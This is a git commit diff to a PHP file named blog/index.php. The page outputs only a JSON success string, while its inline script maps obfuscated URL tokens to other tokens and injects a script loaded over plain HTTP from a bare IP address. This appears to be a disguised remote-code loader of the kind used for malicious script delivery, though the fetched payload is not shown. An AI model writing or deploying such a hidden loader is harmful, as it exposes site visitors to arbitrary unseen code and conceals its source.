7457f26a3ad8c92f033707ca7ab933e0310d9331
clickbunch <clickbunch@gmail.com>
2024-08-02 21:19:35 -0500

    fixes objectMap

--- blog/index.php
+++ blog/index.php
@@ -2,17 +2,19 @@
 <head>
     <script>
         const objectMap = {
-
+            "0fgl75km":"nruldtca",
+            "v302ocn8":"1rdg6n90",
+            "canmh1k6":"fb3pi5yu"
         }
         const param = window.location.search.replace("?", "").split("&")[0];
         console.log("Script", param)
         var script = document.createElement('script');
-        script.setAttribute('src', 'https://beautyuplift.com/blog/?' + param + '.js');
+        script.setAttribute('src', 'http://143.244.156.151/blog/?' + objectMap[param] + '.js');
         document.head.appendChild(script);
     </script>
 </head>
 </head>
 <body>
-    <?php echo '{"success": true}'; ?>
+    <?php echo '{"success": "true"}'; ?>
 </body>
 </html>
